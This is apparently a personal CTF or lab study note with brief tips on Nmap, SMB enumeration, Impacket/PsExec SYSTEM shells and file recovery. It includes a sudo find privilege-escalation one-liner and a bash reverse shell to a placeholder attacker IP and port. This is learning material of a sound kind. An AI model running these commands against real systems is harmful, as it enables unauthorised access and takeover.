---
title: "Impacket and Random Stuff"
tags:
  - hacking
programming-languagues:
created: 2022-07-08
---
## Nmap
- Can use the `-Pn` switch to enumerate machines when packets are blocked by firewall.

## SMB
- Sever Message Block
- Usually port 445

```bash
smbclient -L {taget_IP} -U Administrator
```

## Impacket
It is a framework written in Python for working with network protocols. It is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB and MSRPC) the protol implementation itself. 

Contains dozens of amazing tools for interacting with Windows systems and applications, many of which are ideal for attacking Windows and Active Directory.

**Impacket** creates a remote service by uploading a randomly-named executable on the ADMIN$ share on the remote system and then register it as a Windows service.This will result in having an interactive shell available on the remote Windows system via TCP port 445 .  

**PsExec** is  a portable tool that lets you run processes remotely using any user's credentials.

It requires credentials for a user with local administrator privileges or higher since reading/writing to the ADMIN$ share is required. Once you successfully authenticate, it will drop you into a NT   AUTHORITY\SYSTEM shell.

## Reversed File
```bash
strings login.php.swp >> file.txt  
tac file.txt
```

## Privilege Escalation
Using the find command:

```bash
sudo find . -exec /bin/sh \; -quit
```

## Reverse Shell
```bash
/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'
```

## More random stuff
List strings in the file:

```bash
strings -n 10 <filename>
```